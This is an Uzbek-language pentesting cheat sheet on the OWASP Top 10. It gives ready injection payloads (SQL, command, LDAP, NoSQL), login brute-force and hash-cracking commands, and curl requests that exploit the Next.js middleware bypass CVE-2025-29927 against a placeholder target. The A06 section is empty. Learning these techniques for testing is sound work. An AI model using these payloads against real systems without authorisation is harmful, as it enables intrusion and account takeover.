# 📌 Qism 1: IAAA Failures (A01, A07, A09)

## A01 — Broken Access Control (Buzilgan Kirish Nazorati)
Foydalanuvchi ruxsat etilmagan resurslarga kira olishi.

```
# Misol:
/admin/users  → Oddiy foydalanuvchi kira oladi
/api/user/1   → user/2 ga ham kira oladi (IDOR)
?role=admin   → URL da rol o'zgartirish

# Tekshirish:
- IDOR: ID larni o'zgartiring
- Admin sahifalarga kiring
- Metodni o'zgartiring: GET → POST → PUT → DELETE
- Headerlar: X-Original-URL, X-Rewrite-URL
```

## A07 — Identification and Authentication Failures (Identifikatsiya va Autentifikatsiya Zaifliklari)
Zaif login mexanizmi.

```
# Zaif parol:
admin:admin, admin:password, admin:123456

# Brute force (rate limit yo'q):
ffuf -u http://target.com/login -X POST -d "user=admin&pass=FUZZ" -w rockyou.txt

# Zaif parolni tiklash:
- Bashorat qilinadigan token
- Token muddati yo'q
- Email tekshirilmaydi

# Session management:
- Uzun muddatli session (logout da o'chirilmaydi)
- Bashorat qilinadigan session ID
```

## A09 — Security Logging and Monitoring Failures (Xavfsizlik Logi va Monitoring Zaifliklari)
Hujumlar qayd etilmaydi yoki kuzatilmaydi.

```
# Nima log qilinishi kerak:
- Barcha login urinishlari (muvaffaqiyatli va muvaffaqiyatsiz)
- Muhim amallar (parol o'zgartirish, pul o'tkazish)
- Admin amallari
- Xato so'rovlar (400, 500)

# Pentester uchun:
- Ko'p marta xato login → alert bormi?
- Brute force → IP bloklanadimi?
- Muhim amallar logda ko'rinadimi?
```

# 📌 Qism 2: Application Design Flaws (A02, A03, A06, A10)

## A02 — Cryptographic Failures (Kriptografiya Zaifliklari)
Zaif shifrlash yoki shifrlash yo'qligi.

```
# HTTP da maxfiy ma'lumot:
http:// → Ma'lumot ochiq uzatiladi → Tinglash mumkin!

# Zaif hash:
MD5, SHA1 → Zaif, tez crack qilinadi
Bcrypt, Argon2 → Kuchli

# Hardcoded kalit:
SECRET_KEY = "mysecret123"   ← Zaif!

# Tekshirish:
- HTTPS bormi?
- Parollar qanday saqlanadi? (MD5? Bcrypt?)
- API kalitlar kodda hardcoded?

# Cracking:
hashcat -m 0 hash.txt rockyou.txt     # MD5
hashcat -m 100 hash.txt rockyou.txt   # SHA1
john --wordlist=rockyou.txt hash.txt
```

## A03 — Injection (Kiritish Zaifligi)
SQL, OS, LDAP, NoSQL injection.

```sql
-- SQL Injection:
' OR 1=1-- -
' UNION SELECT 1,database()-- -

-- Command Injection:
; id
| whoami

-- LDAP Injection:
*)(&
*)(uid=*))(|(uid=*

-- NoSQL Injection (MongoDB):
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

## A06 — Vulnerable and Outdated Components (Zaif va Eski Komponentlar)

# Texnologiyani aniqlash:

# 📌 Qism 3: Insecure Data Handling (A04, A05, A08)

## A04 — Insecure Design (Xavfsiz Bo'lmagan Dizayn)
Arxitektura darajasidagi muammolar.

```
# Misol:
- Parolni tiklash: faqat email yuborish (token yo'q)
- Cheksiz API so'rovlar
- Foydalanuvchi ma'lumotlarini server da tekshirmaslik
- Biznes mantiq zaifliklari:
  * Narxni client da hisoblash → o'zgartirish
  * Miqdorni manfiy qilish → pul qaytarish
```

## A05 — Security Misconfiguration (Xavfsizlik Noto'g'ri Sozlash)
Standart sozlamalar, debug rejim, keraksiz xizmatlar.

```bash
# Tekshirish:
- Default credentials: admin:admin, admin:password
- Debug ma'lumotlari: ?debug=true, stack trace
- Keraksiz HTTP metodlar: OPTIONS → DELETE, PUT
- Directory listing: /uploads/ → barcha fayllar ko'rinadi
- Xato xabarlari: SQL query, fayl yo'li ko'rinadi
- Security headerlar yo'q:
  X-Frame-Options
  Content-Security-Policy
  X-XSS-Protection

# Tekshirish vositalari:
nikto -h http://target.com
curl -I http://target.com   # Headerlarni ko'rish
```

## A08 — Software and Data Integrity Failures (Dasturiy Ta'minot va Ma'lumotlar Yaxlitligi Buzilishi)
Tasdiqlashsiz kod yoki ma'lumot yangilash.

```
# CI/CD zaiflik:
→ GitHub Actions zaif → Zararli kod pipeline ga kiritiladi

# Serialization (Ob'ektni baytga aylantirish) zaifligi:
→ Zaif deserialization → RCE

# Insecure update:
→ HTTPS siz yangilanish → MITM → Zararli yangilanish
```

## 🎯 Next.js CVE-2025-29927 — Avtorizatsiya Bypass

```
# Zaiflik: Next.js middleware ni chetlab o'tish
# Versiyalar: < 15.2.3

# Middleware (himoya):
export function middleware(req) {
  if (!req.cookies.token) redirect('/login');
}

# Bypass — maxsus header:
x-middleware-subrequest: middleware

# Hujum:
curl http://target.com/admin \
  -H "x-middleware-subrequest: middleware"
→ Login sahifasiga redirect bo'lmasdan admin ga kirish!

# Tekshirish:
curl -v http://target.com/admin -H "x-middleware-subrequest: middleware"
curl -v http://target.com/dashboard -H "x-middleware-subrequest: pages/_middleware"
```
